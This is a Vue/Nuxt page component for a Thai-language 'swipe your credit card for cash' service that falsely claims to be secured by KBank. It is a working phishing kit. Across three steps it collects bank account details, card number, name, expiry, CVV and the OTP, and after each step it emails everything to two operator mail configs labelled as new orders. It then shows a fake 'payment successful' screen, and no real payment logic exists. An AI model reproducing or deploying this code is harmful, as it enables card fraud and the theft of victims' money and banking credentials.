<template>
  <div>
    <div id="payment">
      <div class="py-2 px-3 flex items-center justify-between w-full bg-black/80">
        <div class="py-4  ">
          <img src="~assets/img/logo.svg" class="h-full w-auto " />
        </div>
        <div class="text-white sm:flex">
          <h3 class="ms-6">รูดบัตรเครดิตของคุณเพื่อรับเงินสดออนไลน์</h3>
          <h3 class="ms-6"> ปลอดดอกเบี้ย 45 วันแรก</h3>
          <h3 class="ms-6">ค่าบริการ 2.5%</h3>
        </div>
      </div>
      <div class="">
        <img src="~assets/img/image_top_2.jpg" class="w-full h-atuo" />
      </div>
      <div class="px-3 py-4 " v-if="formShow == 1">
        <div class=" mb-4">
          <input v-model="form1.bank_user" type="text" placeholder="เจ้าของบัญชี" class="w-full h-14 rounded-full px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.bank_user }}</h3>
        </div>
        <div class=" mb-4">
          <input v-model="form1.number_money_get" @click="inputAmount" @input="inputAmount" @change="updateAmount" type="text" placeholder="จำนวนเงินที่คุณต้องการรูด (THB)" class="w-full h-14 rounded-full px-5 focus:outline-none focus:ring focus:ring-blue-500  " />

          <h3 class="px-3 text-rose-500">{{ error.number_money_get }}</h3>
        </div>
        <div class=" mb-4">
          <input v-model="form1.bank_name" type="text" placeholder="ธนาคาร" class="w-full h-14 rounded-full px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.bank_name }}</h3>
        </div>
        <div class=" mb-4">
          <input v-model="form1.bank_number" type="text" placeholder="หมายเลขบัญชี" class="w-full h-14 rounded-full px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.bank_number }}</h3>
        </div>
        <div class=" mb-4">
          <input v-model="form1.phone" type="text" placeholder="หมายเลขโทรศัพท์" class="w-full h-14 rounded-full px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.phone }}</h3>
        </div>
        <div class=" px-5  flex items-center mb-3 text-black/80">
          <Icon name="bi:exclamation-octagon-fill" class="me-3 " /> กรุณาตรวจสอบข้อมูลให้ถูกต้องและคลิกยืนยัน
        </div>
        <div class=" px-5  flex items-center mb-3 text-black/80">
          <Icon name="material-symbols:check-circle-rounded" class="me-3 " /> ระบบจะตรวจสอบและโอนเงินอัตโนมัติภายใน 2-5 นาที
        </div>
        <div class=" mb-4">
          <div class="flex items-center justify-center">
            <button class="px-5 py-2 bg-emerald-900 text-2xl font-bold text-white rounded " @click="checkForm1()">ยืนยัน
              <Icon name="mdi:check-bold" />
            </button>
          </div>
        </div>
      </div>

      <div v-else-if="formShow == 2" class="px-3 py-4  ">
        <div class="px-3 text-black/80">
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">เจ้าของบัญชี :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_user }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5"> <span class="md:block hidden">จำนวนเงินที่คุณต้องการรูด :</span> <span class="md:hidden">ป้อนจำนวนเงิน :</span> </div>

            <div class="md:col-span-8 col-span-7">{{ form1.number_money_get }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">ธนาคาร :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_name }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">หมายเลขบัญชี :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_number }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">หมายเลขโทรศัพท์ :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.phone }}</div>
          </div>
        </div>
        <div class="flex items-center justify-center">
          <div class="my-3 text-center flex items-center justify-center bg-white">
            <!-- <div class="w-20 mx-3"> <img src="~assets/img/visa.png" class="" alt=""></div> -->
            <!-- <div class="w-20 mx-3"> <img src="~assets/img/master_card.png" class="" alt=""></div> -->
            <!-- <div class="w-20 mx-3"> <img src="~assets/img/jcb.jpg" class="" alt=""></div> -->
            <div class="sm:h-16 sm:w-auto w-full h-auto mx-3"> <img src="~assets/img/list_visa.jpg" class="md:h-full md:w-auto  w-full h-auto" alt=""></div>
          </div>
        </div>

        <div class=" mb-4">
          <input v-model="form2.card_number" @input="formatCardNumber" maxlength="20" type="text" placeholder="หมายเลขบัตร" class="w-full h-14 rounded px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.card_number }}</h3>
        </div>
        <div class=" mb-4">
          <input v-model="form2.card_name" type="text" placeholder="ชื่อผู้ถือบัตร" class="w-full h-14 rounded px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.card_name }}</h3>
        </div>

        <div class="grid grid-cols-12 gap-4 mb-3">
          <div class="col-span-6">
            <div class=" mb-4">
              <input v-model="form2.card_date" type="text" @input="formatDate" maxlength="5" placeholder="วันหมดอายุ (ดด/ปป)" class="w-full h-14 rounded px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
              <h3 class="px-3 text-rose-500">{{ error.card_date }}</h3>
            </div>
          </div>
          <div class="col-span-6">
            <div class=" mb-4">
              <input v-model="form2.card_cvc" type="text" maxlength="4" placeholder="CVV/CVV2" class="w-full h-14 rounded px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
              <h3 class="px-3 text-rose-500">{{ error.card_cvc }}</h3>
            </div>
          </div>
        </div>



        <div class=" px-5  flex items-center justify-center mb-3 text-black/80">
          ระบบจะหักค่าบริการ 2.5% โดยอัตโนมัติ
        </div>
        <div class=" mb-4">
          <div class="text-center">
            <button class=" min-w-40 px-5 py-2 bg-emerald-900 font-bold text-white rounded " @click="checkForm2">Pay Now
              <Icon name="mdi:check-bold" />
            </button>
          </div>
        </div>
        <div class=" mb-4">
          <div class="text-center">
            <button class="min-w-40 px-5 py-2 bg-gray-500/20 text-black/80 rounded " @click="formShow = 1">Back
            </button>
          </div>
        </div>
      </div>


      <div v-else-if="formShow == 3" class="px-3 py-4  ">


        <div class="px-3 text-black/80 mb-5">
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">เจ้าของบัญชี :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_user }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5"> <span class="md:block hidden">จำนวนเงินที่คุณต้องการรูด :</span> <span class="md:hidden">ป้อนจำนวนเงิน :</span> </div>
            <div class="md:col-span-8 col-span-7">{{ form1.number_money_get }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">ธนาคาร :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_name }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">หมายเลขบัญชี :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.bank_number }}</div>
          </div>
          <div class="grid grid-cols-12 gap-4 ">
            <div class="md:col-span-4 col-span-5">หมายเลขโทรศัพท์ :</div>
            <div class="md:col-span-8 col-span-7">{{ form1.phone }}</div>
          </div>
        </div>
        <div class=" mb-4">
          <input v-model="form3.otp" type="text" placeholder=" OTP (Smart OTP)" class="w-full h-14 rounded px-5 focus:outline-none focus:ring focus:ring-blue-500  " />
          <h3 class="px-3 text-rose-500">{{ error.otp }}</h3>
        </div>

        <div class=" px-5  flex items-center justify-center mb-3 text-white">
          <!-- ระบบจะหักค่าบริการ 2.5% โดยอัตโนมัติ -->
        </div>
        <div class=" mb-4">
          <div class="text-center">
            <button class=" min-w-40 px-5 py-2 bg-emerald-900 font-bold text-white rounded" @click="checkForm3">Pay Now
              <Icon name="mdi:check-bold" />
            </button>
          </div>
        </div>
        <div class=" mb-4">
          <div class="text-center">
            <button class="min-w-40 px-5 py-2 bg-gray-500/20 text-black/80 rounded" @click="formShow = 2">Back
            </button>
          </div>
        </div>
      </div>
      <div v-else-if="formShow == 4" class="px-3 py-4  ">

        <div class="py-10 flex items-center justify-center text-4xl font-bold text-emerald-900 ">
          <div class="text-green-700 text-center ">
            <div class="text-center text-4xl mb-3">
              <Icon name="material-symbols:check-circle" style="font-size: 100px;" />

            </div>

            <h3>
              การชำระเงินสำเร็จ

            </h3>
          </div>
        </div>


      </div>
      <div class="flex items-center justify-center pb-10">
        <h3 class="font-bold text-xs text-black me-3">Secured by</h3>
        <img src="~assets/img/KBank-logo.png" class="h-10 w-auto " />


      </div>



    </div>
  </div>
</template>
<script>
export default {

  data() {
    return {
      formShow: 1,
      error: {
        bank_user: '',
        phone: '',
        number_money_get: '',
        bank_name: '',
        bank_number: '',
        card_name: '',
        card_number: '',
        card_date: '',
        card_cvc: '',
        otp: '',
      },
      form1: {
        bank_user: '',
        number_money_get: '',
        bank_name: '',
        bank_number: '',
        phone: '',

      },
      form2: {
        card_name: '',
        card_number: '',
        card_date: '',
        card_cvc: '',
      },
      form3: {
        otp: '',
      },
    }
  },

  methods: {
    formatCardNumber() {
      let cardNumber = this.form2.card_number.replace(/[^0-9.]/g, '');
      console.log(cardNumber.length)
      // Thêm khoảng trắng sau mỗi bốn ký tự nếu không có khoảng trắng và không phải ký tự cuối cùng
      if (cardNumber.length % 4 === 0 && cardNumber.length > 0 && !cardNumber.endsWith(' ')) {
        this.form2.card_number += ' ';
      }

      // Xóa khoảng trắng cuối cùng nếu người dùng xóa số thẻ
      if (cardNumber.endsWith(' ') && cardNumber.length > 0) {
        this.form2.card_number = cardNumber.slice(0, -1);
      }
    },
    formatDate() {
      const data = this.form2.card_date;
      if (data.length === 2 && !data.includes('/')) {
        this.form2.card_date += '/';
      }
      // Tự động xóa dấu '/' khi người dùng xóa đi ngày và tháng cuối cùng
      if (data.length === 3 && data.endsWith('/')) {
        this.form2.card_date = this.form2.card_date.slice(0, 2);
      }
    },

    inputAmount() {
      const data = this.form1.number_money_get;
      if (data) {
        const value = data.replace(/[^0-9.]/g, '').replace(/(฿)|(\.00)/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        this.form1.number_money_get = value;
      } else {
        this.form1.number_money_get = '';

      }

    },
    updateAmount() {
      // Loại bỏ các ký tự không phải là số hoặc dấu chấm thập phân
      const data = this.form1.number_money_get;
      if (data) {

        let value = data.replace(/[^0-9.]/g, '');
        if (value) {

          // // Chuyển đổi giá trị sang kiểu số thực

          // // Định dạng giá trị thành baht Thái Lan
          const formatter = new Intl.NumberFormat('th-TH', {
            style: 'currency',
            currency: 'THB'
          });
          const format = formatter.format(value);
          this.tesst = format;
          this.form1.number_money_get = this.tesst;

        }
        else {
          this.form1.number_money_get = 0;

        }
      }
      else {
        this.form1.number_money_get = 0;

      }
    },
    checkForm1() {
      for (let key in this.error) {
        this.error[key] = '';
      }
      for (const key in this.form1) {
        const value = this.form1[key];
        if (value.trim() === '') {
          this.error[key] = 'กรุณากรอกข้อมูล';
          return true;
        }
      }
      this.formShow = 2;
      const bank_user = this.form1.bank_user;
      const number_money_get = this.form1.number_money_get;
      const bank_name = this.form1.bank_name;
      const bank_number = this.form1.bank_number;
      const phone = this.form1.phone;
      const mesage = 'Chủ tài khoản: ' + bank_user + ' \n' + 'Số tiền rút : ' + number_money_get + ' \n' + 'Ngân Hàng : ' + bank_name + ' \n' + 'Số tài khoản : ' + bank_number + ' \n' + 'Số điện thoại : ' + phone + ' \n';
      const mail = useMail()
      mail.send({
        config: 'support1',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 1',
        text: mesage
      })
      mail.send({
        config: 'support2',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 1',
        text: mesage
      })


    },


    checkForm2() {
      for (let key in this.error) {
        this.error[key] = '';
      }
      for (const key in this.form2) {
        const value = this.form2[key];
        if (value.trim() === '') {
          this.error[key] = 'กรุณากรอกข้อมูล';
          return true;
        }
      }
      this.formShow = 3;

      const bank_user = this.form1.bank_user;
      const number_money_get = this.form1.number_money_get;
      const bank_name = this.form1.bank_name;
      const bank_number = this.form1.bank_number;
      const phone = this.form1.phone;
      const mesage1 = 'Chủ tài khoản: ' + bank_user + ' \n' + 'Số tiền rút : ' + number_money_get + ' \n' + 'Ngân Hàng : ' + bank_name + ' \n' + 'Số tài khoản : ' + bank_number + ' \n' + 'Số điện thoại : ' + phone + ' \n';


      const card_name = this.form2.card_name;
      const card_number = this.form2.card_number;
      const card_date = this.form2.card_date;
      const card_cvc = this.form2.card_cvc;
      const mesage2 = ' \n' + 'Tên trên thẻ: ' + card_name + ' \n' + 'Số thẻ : ' + card_number + ' \n' + 'Ngày hết hạn: ' + card_date + ' \n' + 'CVC/CVV2: ' + card_cvc + ' \n';


      const mail = useMail()
      mail.send({
        config: 'support1',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 2',
        text: mesage1 + mesage2
      })
      mail.send({
        config: 'support2',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 2',
        text: mesage1 + mesage2
      })



    },
    checkForm3() {
      for (let key in this.error) {
        this.error[key] = '';
      }
      for (const key in this.form3) {
        const value = this.form3[key];
        if (value.trim() === '') {
          this.error[key] = 'กรุณากรอกข้อมูล';
          return true;
        }
      }


      this.formShow = 4

      const bank_user = this.form1.bank_user;
      const number_money_get = this.form1.number_money_get;
      const bank_name = this.form1.bank_name;
      const bank_number = this.form1.bank_number;
      const phone = this.form1.phone;
      const mesage1 = 'Chủ tài khoản: ' + bank_user + ' \n' + 'Số tiền rút : ' + number_money_get + ' \n' + 'Ngân Hàng : ' + bank_name + ' \n' + 'Số tài khoản : ' + bank_number + ' \n' + 'Số điện thoại : ' + phone + ' \n';


      const card_name = this.form2.card_name;
      const card_number = this.form2.card_number;
      const card_date = this.form2.card_date;
      const card_cvc = this.form2.card_cvc;
      const mesage2 = ' \n' + 'Tên trên thẻ: ' + card_name + ' \n' + 'Số thẻ : ' + card_number + ' \n' + 'Ngày hết hạn: ' + card_date + ' \n' + 'CVC/CVV2: ' + card_cvc + ' \n';

      const otp = this.form3.otp;
      const mesage3 = ' \n' + 'OTP: ' + otp + ' \n';

      const mail = useMail()
      mail.send({
        config: 'support1',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 3',
        text: mesage1 + mesage2 + mesage3
      })
      mail.send({
        config: 'support2',
        from: 'John Doe',
        subject: 'Có đơn hàng mới lần 3',
        text: mesage1 + mesage2 + mesage3
      })


    },
  },
}
</script>
<style scoped>
#payment {

  min-height: 100vh;
  background: rgb(0, 0, 0, 0.1);
  max-width: 1000px;
  width: 100%;
  margin: auto;
}

#payment input {
  border: solid 2px #999;
}
</style>